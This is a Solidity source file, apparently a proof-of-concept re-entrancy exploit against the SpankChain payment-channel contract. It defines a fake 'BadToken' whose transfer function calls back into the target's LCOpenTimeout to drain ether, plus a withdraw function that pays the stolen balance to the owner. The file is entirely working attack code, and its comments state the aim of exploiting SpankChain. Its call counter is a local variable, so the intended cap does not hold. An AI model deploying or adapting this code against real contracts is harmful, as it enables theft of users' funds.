pragma solidity ^0.4.23;

contract Channel {
    function createChannel(
        bytes32 _lcID,
        address _partyI,
        uint256 _confirmtime,
        address _token,
        uint256[2] _balances // [eth, token]
    ) public payable;
    
    function LCOpenTimeout(bytes32 _lcID) public;
}

contract BadToken {
    address owner;
    address target; // spankchain contract address we want to exploit
    
    // just a random 32 bytes used for the channelID
    bytes32 data = bytes32(0x390469ecab3c63eb15dfc6470ef63d139d417ab93f3fbc659e992c70913f1f);
    
    constructor(address _target) public {
        owner = msg.sender;
        target = _target;
    }
    
    function() public payable {
        // Need this to accept the ether transfer
    }
    
    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
    
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
    
    function openChannel() public payable {
        Channel(target).createChannel.value(msg.value)(data, address(this), 0, address(this), [uint256(msg.value), uint256(100)]);
    }
    
    function attack() public {
        Channel(target).LCOpenTimeout(data);
    }
    
    function transfer(address _receiver, uint256 _amount) public returns(bool) {
        uint callCount;
        
        if (callCount < 5) {
            callCount += 1;
            Channel(target).LCOpenTimeout(data);
        }
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _amount) public returns(bool) {
        return true;
    }
}